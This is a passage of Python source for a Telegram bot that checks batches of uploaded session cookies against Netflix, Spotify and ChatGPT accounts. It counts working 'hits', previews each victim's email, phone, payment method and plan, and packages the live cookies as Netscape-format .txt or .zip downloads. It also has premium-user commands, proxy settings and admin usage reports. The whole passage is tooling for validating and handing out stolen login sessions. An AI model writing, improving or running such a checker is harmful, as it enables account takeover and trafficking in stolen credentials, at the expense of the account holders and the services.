                                f"Email Verified: {scrub_text(clean_unicode(result.get('email_verified', 'Unknown')))}",
                                f"Phone: {scrub_text(clean_unicode(result.get('phone', 'Unknown')))}",
                                f"Phone Verified: {scrub_text(clean_unicode(result.get('phone_verified', 'Unknown')))}",
                                f"Video Quality: {scrub_text(clean_unicode(result.get('video_quality', 'Unknown')))}",
                                f"Max Streams: {scrub_text(clean_unicode(result.get('max_streams', 'Unknown')))}",
                                f"On Payment Hold: {scrub_text(clean_unicode(result.get('on_payment_hold', 'Unknown')))}",
                                f"Extra Member: {scrub_text(clean_unicode(result.get('extra_member', 'Unknown')))}",
                                f"Profiles: {scrub_text(clean_unicode(result.get('profiles', 'Unknown')))}",
                            ]
                            domain = ".netflix.com"
                        elif mode == "spotify":
                            details = [
                                f"Plan: {scrub_text(clean_unicode(result.get('plan', 'Unknown')))}",
                                f"Country: {scrub_text(clean_unicode(result.get('country', 'Unknown')))}",
                            ]
                            domain = ".spotify.com"
                        else:
                            details = [
                                f"Plan: {scrub_text(clean_unicode(result.get('plan', 'Unknown')))}",
                                f"Country: {scrub_text(clean_unicode(result.get('country', 'Unknown')))}",
                            ]
                            domain = ".chat.openai.com"

                        preview_content = "\n".join(details)
                        try:
                            await context.bot.edit_message_text(
                                chat_id=chat_id, message_id=preview_msg_id,
                                text=f"<b>Hit #{hits} Preview:</b>\n<pre>{preview_content}</pre>", parse_mode='HTML'
                            )
                        except BadRequest:
                            pass  # same content
                    elif mode == "netflix" and result.get("ok"):
                        free += 1
                    else:
                        fails += 1

                dots_done = min(dot_length, checked * dot_length // total)
                dots_left = dot_length - dots_done
                dot_bar = '●' * dots_done + '○' * dots_left
                new_text = (
                    f"<b>{mode_display} Cookie Checking</b>\n"
                    f"<code>{dot_bar}</code>  {checked}/{total}\n"
                )
                if mode == "chatgpt":
                    new_text += f"Hits: <b>{hits}</b> | Fails: <b>{fails}</b>"
                else:
                    new_text += f"Hits: <b>{hits}</b> | Free: <b>{free}</b> | Fails: <b>{fails}</b>"
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=msg_id, text=new_text,
                        parse_mode='HTML', reply_markup=reply_markup
                    )
                except BadRequest:
                    pass
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass
    finally:
        async with user_locks[user_id]:
            user_state[user_id]['busy'] = False
            user_state[user_id]['stop'] = False
            if user_id in user_executors:
                user_executors[user_id].shutdown(wait=False)
                del user_executors[user_id]
            if user_id in user_tasks:
                del user_tasks[user_id]
            # record stats
            store.record_stats(user_id, checked, hits, fails)
            # notify user
            try:
                await context.bot.send_message(chat_id, "✅ Your check has finished.")
            except Exception:
                pass

    if hits:
        user_state[user_id]['final_hits'] = OrderedDict(live_hits)
        format_markup = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Get as .txt", callback_data="result_txt"),
                InlineKeyboardButton("Get as .zip", callback_data="result_zip"),
            ]
        ])
        await context.bot.send_message(
            chat_id,
            f"✅ Done!\nChecked: {checked}\nHits: {hits} | Fails: {fails}" +
            ("" if mode == "chatgpt" else f" | Free: {free}") +             "\n<b>Select result format:</b>",
            parse_mode='HTML',
            reply_markup=format_markup
        )
    else:
        await context.bot.send_message(
            chat_id,
            f"✅ Done!\nChecked: {checked}\nHits: 0 | Fails: {fails}" +
            ("" if mode == "chatgpt" else f" | Free: {free}") +
            "\n<b>No premium hits found.</b>",
            parse_mode='HTML'
        )
    try:
        if ADMIN_CHANNEL and ADMIN_CHANNEL < 0:
            await context.bot.send_message(
                ADMIN_CHANNEL,
                f"User <a href='tg://user?id={user_id}'>{user_id}</a> checked {checked} cookies in {mode_display} mode.\nHits: {hits} | Fails: {fails}" +
                ("" if mode == "chatgpt" else f" | Free: {free}"),
                parse_mode='HTML'
            )
    except Exception:
        log.exception("Admin notify fail")

# ------------ RESULT HANDLERS ------------
async def send_result_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    hits = user_state.get(user_id, {}).get('final_hits', OrderedDict())
    if not hits:
        await query.answer("No hits available.")
        return

    mode = user_state[user_id].get('mode', 'netflix')
    if mode == "netflix":
        domain = ".netflix.com"
    elif mode == "spotify":
        domain = ".spotify.com"
    else:
        domain = ".chat.openai.com"

    all_hits = []
    # read from temp file if needed
    tmp_path = user_state.get(user_id, {}).get('hits_tmp')
    if tmp_path and os.path.exists(tmp_path):
        with open(tmp_path) as f:
            for idx, line in enumerate(f, 1):
                result = json.loads(line)
                build_export(result, idx, all_hits, mode, domain)
    else:
        for idx, (name, details_dict) in enumerate(hits.items(), 1):
            build_export(details_dict, idx, all_hits, mode, domain)

    txt_buffer = io.BytesIO(("\n\n".join(all_hits)).encode("utf-8"))
    await context.bot.send_document(
        chat_id,
        document=InputFile(txt_buffer, filename="All_Hits.txt"),
        caption=f"All hits as .txt file"
    )
    await query.answer("Sent as .txt")

async def send_result_zip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    hits = user_state.get(user_id, {}).get('final_hits', OrderedDict())
    if not hits:
        await query.answer("No hits available.")
        return

    mode = user_state[user_id].get('mode', 'netflix')
    if mode == "netflix":
        domain = ".netflix.com"
    elif mode == "spotify":
        domain = ".spotify.com"
    else:
        domain = ".chat.openai.com"
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        tmp_path = user_state.get(user_id, {}).get('hits_tmp')
        if tmp_path and os.path.exists(tmp_path):
            with open(tmp_path) as f:
                for idx, line in enumerate(f, 1):
                    result = json.loads(line)
                    file_content = build_export_str(result, idx, mode, domain)
                    zipf.writestr(f"cookie_{idx}_@S4J4G.txt", file_content)
        else:
            for idx, (name, details_dict) in enumerate(hits.items(), 1):
                file_content = build_export_str(details_dict, idx, mode, domain)
                zipf.writestr(f"cookie_{idx}_@S4J4G.txt", file_content)
    zip_buffer.seek(0)
    await context.bot.send_document(
        chat_id,
        document=InputFile(zip_buffer, filename="All_Hits.zip"),
        caption=f"All hits as .zip file"
    )
    await query.answer("Sent as .zip")

def build_export_str(details_dict, idx, mode, domain):
    if mode == 'netflix':
        details = [
            f"Plan: {clean_unicode(details_dict.get('plan', 'Unknown'))}",
            f"Plan Price: {clean_unicode(details_dict.get('plan_price', 'Unknown'))}",
            f"Country: {clean_unicode(details_dict.get('country', 'Unknown'))}",
            f"Member Since: {clean_unicode(details_dict.get('member_since', 'Unknown'))}",
            f"Payment Method: {clean_unicode(details_dict.get('payment_method', 'Unknown'))}",
            f"Email: {clean_unicode(details_dict.get('email', 'Unknown'))}",
            f"Email Verified: {clean_unicode(details_dict.get('email_verified', 'Unknown'))}",
            f"Phone: {clean_unicode(details_dict.get('phone', 'Unknown'))}",
            f"Phone Verified: {clean_unicode(details_dict.get('phone_verified', 'Unknown'))}",
            f"Video Quality: {clean_unicode(details_dict.get('video_quality', 'Unknown'))}",
            f"Max Streams: {clean_unicode(details_dict.get('max_streams', 'Unknown'))}",
            f"On Payment Hold: {clean_unicode(details_dict.get('on_payment_hold', 'Unknown'))}",
            f"Extra Member: {clean_unicode(details_dict.get('extra_member', 'Unknown'))}",
            f"Profiles: {clean_unicode(details_dict.get('profiles', 'Unknown'))}",
        ]
    else:
        details = [
            f"Plan: {clean_unicode(details_dict.get('plan', 'Unknown'))}",
            f"Country: {clean_unicode(details_dict.get('country', 'Unknown'))}",
        ]

    cookie_dict = details_dict.get('cookie', {})
    if isinstance(cookie_dict, dict):
        netscape = dict_to_netscape(cookie_dict, domain)
    elif isinstance(cookie_dict, str):
        netscape = cookie_dict
    else:
        netscape = str(cookie_dict)

    file_content = (
        f"========== HIT #{idx} ==========\n" +
        "\n".join(details) +
        "\nNetscape Cookie ↓\n" +
        netscape
    )
    return file_content

def build_export(details_dict, idx, all_hits, mode, domain):
    all_hits.append(build_export_str(details_dict, idx, mode, domain))

# -------------- main --------------
if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("add", add_premium))
    app.add_handler(CommandHandler("remove", remove_premium))
    app.add_handler(CommandHandler("setproxy", set_proxy))
    app.add_handler(CommandHandler("users", list_users))
    app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_(spotify|netflix|chatgpt)$"))
    app.add_handler(CallbackQueryHandler(switchmode, pattern="^switchmode_(spotify|netflix|chatgpt)$"))
    app.add_handler(CallbackQueryHandler(stop_check, pattern="^stop_check$"))
    app.add_handler(CallbackQueryHandler(send_result_txt, pattern="^result_txt$"))
    app.add_handler(CallbackQueryHandler(send_result_zip, pattern="^result_zip$"))
    app.add_handler(CallbackQueryHandler(start_check, pattern="^start_check$"))
    app.add_handler(CallbackQueryHandler(get_hits, pattern="^get_hits$"))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, file_upload))

    if os.getenv("USE_WEBHOOK", "0") == "1":
        webhook_url = os.getenv("WEBHOOK_URL")
        port = int(os.getenv("PORT", 8080))
        app.run_webhook(listen="0.0.0.0", port=port, webhook_url=webhook_url)
    else:
        app.run_polling()
